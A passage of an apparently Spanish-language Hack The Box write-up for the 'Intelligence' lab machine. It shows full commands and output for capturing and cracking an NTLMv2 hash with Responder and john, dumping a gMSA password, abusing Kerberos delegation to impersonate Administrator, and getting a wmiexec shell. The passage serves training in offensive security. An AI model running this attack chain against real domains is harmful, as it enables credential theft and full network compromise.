           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder
E3 &h
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.6]
    Responder IPv6             [dead:beef:4::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-Q5CZ60QUUQR]
    Responder Domain Name      [1CYB.LOCAL]
    Responder DCE-RPC Port     [49185]

[+] Listening for events...
[HTTP] Sending NTLM authentication request to 10.10.10.248
[HTTP] GET request from: ::ffff:10.10.10.248  URL: / 
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:17008e5d03130315:ECA5091D5C7670B679625A2995E1198D:0101000000000000972FB1E1782FD901B53C05A49A11D5C10000000002000800310043005900420001001E00570049004E002D005100350043005A0036003000510055005500510052000400140031004300590042002E004C004F00430041004C0003003400570049004E002D005100350043005A0036003000510055005500510052002E0031004300590042002E004C004F00430041004C000500140031004300590042002E004C004F00430041004C000800300030000000000000000000000000200000A8B69F7063E34A9FE318AB7633C7F23B57A21DA648FEC8700FE24E917EE3AF030A0010000000000000000000000000000000000009003C0048005400540050002F00770065006200720075006200620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

[+] Exiting...
```

Almaceno el hash en un archivo y lo crackeo con john

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:04 DONE (2023-01-23 15:19) 0.2020g/s 2184Kp/s 2184Kc/s 2184KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Añado las credenciales

```null
echo 'Ted.Graves:Mr.Teddy' >> credentials.txt
```

En el reporte de ldapdomaindump, había visto que ningún usuario pertenecía al grupo Remote Management Users

Pero en caso de que el usuario sea privilegiado puedo ganar acceso por SMB

```null
crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```

No es el caso, así que paso a una enumeración por BloodHound

```null
bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.206 seconds: Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.; Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.
INFO: Traceback (most recent call last):
INFO: Done in 01M 47S
```

Abro BloodHound y arranco la base de datos para subir los datos

```null
neo4j console
```

Marco los dos usuarios como pwneados

Destaca lo siguiente:

<img src="/writeups/assets/img/Intelligence-htb/4.png" alt="">

El usuario Ted.Graves miembro del grupo ITSupport, tiene capacidad de ReadGMSAPassword sobre svc_int, por lo que puedo dumpear la contraseña del Service Account

<img src="/writeups/assets/img/Intelligence-htb/5.png" alt="">

Como todavía no tengo acceso a la máquina, voy a utilizar gmsadumper

```null
git clone https://github.com/colinator27/GMSDumper
cd gMSADumper

python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::4eded24079fe2667c67f2b43fd6cb57b
svc_int$:aes256-cts-hmac-sha1-96:3f07249f66a3678529bc87b0d6bce206d86ef0e5ed00f488d66751810c722817
svc_int$:aes128-cts-hmac-sha1-96:b8173f21d39ccd3e047ea12c2f791ab4
```
Dentro de las proviedades del Service Account, se puede ver que tiene AllowedToDelegate sobre el dominio

<img src="/writeups/assets/img/Intelligence-htb/6.png" alt="">

Esto significa que tengo la capacidad de impersonar a un usuario. Como no estoy dentro de la máquina, puedo tratar de obtener un TGT del usuario Administrador para que me pueda autenticar por Kerberos a la máquina víctima

```null
getST.py intelligence.htb/svc_int -hashes :4eded24079fe2667c67f2b43fd6cb57b -impersonate Administrator -spn WWW/dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

En caso de no estar sincronizado con el reloj del DC, no va a funcionar el ataque

Para ello utilicé lo siguiente:

```null
date --set="$(curl -s 10.10.10.248 -I | grep Date | cut -c 7- | tr -d "\n")"
```

Y ahora ya obtengo el TGT

```null
getST.py intelligence.htb/svc_int -hashes :4eded24079fe2667c67f2b43fd6cb57b -impersonate Administrator -spn WWW/dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Exporto el ticket a la variable de entorno KRB5CCNAME y con wmiexec obtengo una shell interactiva

```null
wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>
```

Y puedo visualizar la segunda flag

```null
C:\>type C:\Users\Administrator\Desktop\root.txt
9511f0fc49c39e0012d597e6f9385f7e
```